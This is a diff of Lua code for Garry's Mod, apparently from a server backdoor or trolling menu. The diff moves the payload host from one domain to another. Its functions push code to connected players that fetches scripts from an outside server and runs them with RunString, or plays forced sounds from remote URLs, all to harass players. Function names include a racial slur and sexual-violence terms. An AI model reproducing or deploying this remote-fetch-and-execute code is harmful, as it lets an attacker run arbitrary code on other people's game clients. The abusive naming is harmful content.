@@ -500,15 +500,15 @@ end
 /* Visuals */ 
 
 function localNews() 
-	sendLuaPly([[http.Fetch("http://ambush.pw/new1.txt",function(body) RunString(body) end)]]) 
+	sendLuaPly([[http.Fetch("http://gubbi.xyz/new1.txt",function(body) RunString(body) end)]]) 
 end 
 
 function screenRape() 
-	sendLuaPly([[http.Fetch("http://ambush.pw/html2.txt",function(body) RunString(body) end)]]) 
+	sendLuaPly([[http.Fetch("http://gubbi.xyz/html2.txt",function(body) RunString(body) end)]]) 
 end 
 
 function fallingFood() 
-	sendLuaPly([[http.Fetch("https://pastebin.com/raw/MQbft6Ds",function(body) RunString(body) end)]]) 
+	sendLuaPly([[http.Fetch("http://gubbi.xyz/fallingfood.lua",function(body) RunString(body) end)]]) 
 end 
 
 function seizedImages() 
@@ -516,7 +516,7 @@ function seizedImages()
 end 
 
 function fuckMap() 
-	sendLuaPly([[http.Fetch("http://ambush.pw/rainbow4.txt",function(body) RunString(body) end)]]) 
+	sendLuaPly([[http.Fetch("http://gubbi.xyz/rainbow4.txt",function(body) RunString(body) end)]]) 
 end 
 
 function earthQuake() 
@@ -531,7 +531,7 @@ function fuckBones()
 end 
 
 function spinningHeads() 
-	sendLuaPly([[http.Fetch("http://ambush.pw/bonemanip.txt",function(body) RunString(body) end)]]) 
+	sendLuaPly([[http.Fetch("http://gubbi.xyz/bonemanip.txt",function(body) RunString(body) end)]]) 
 end 
 
 function openDoors() 
@@ -701,27 +701,27 @@ function playSongLink()
 end 
 
 function thickNiggas() 
-	sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/dbangs.mp3", "mono", function() end)]]) 
+	sendLuaPly([[sound.PlayURL("http://gubbi.xyz/songs/dbangs.mp3", "mono", function() end)]]) 
 end 
 
 function sandstorm() 
-	sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/sandstorm.mp3", "mono", function() end)]]) 
+	sendLuaPly([[sound.PlayURL("http://gubbi.xyz/songs/sandstorm.mp3", "mono", function() end)]]) 
 end 
 
 function marylinMonroe() 
-	sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/mm.mp3", "mono", function() end)]]) 
+	sendLuaPly([[sound.PlayURL("http://gubbi.xyz/songs/mm.mp3", "mono", function() end)]]) 
 end 
 
 function earRape() 
-	sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/earrape.mov", "mono", function() end)]]) 
+	sendLuaPly([[sound.PlayURL("http://gubbi.xyz/songs/earrape.mov", "mono", function() end)]]) 
 end 
 
 function oldTown() 
-	sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/oldtown.mp3", "mono", function() end)]]) 
+	sendLuaPly([[sound.PlayURL("http://gubbi.xyz/songs/oldtown.mp3", "mono", function() end)]]) 
 end 
 
 function thotThot() 
-	sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/thot.mp3", "mono", function() end)]])
+	sendLuaPly([[sound.PlayURL("http://gubbi.xyz/songs/thot.mp3", "mono", function() end)]])
 end 
 
 /* Player Funcs */ 
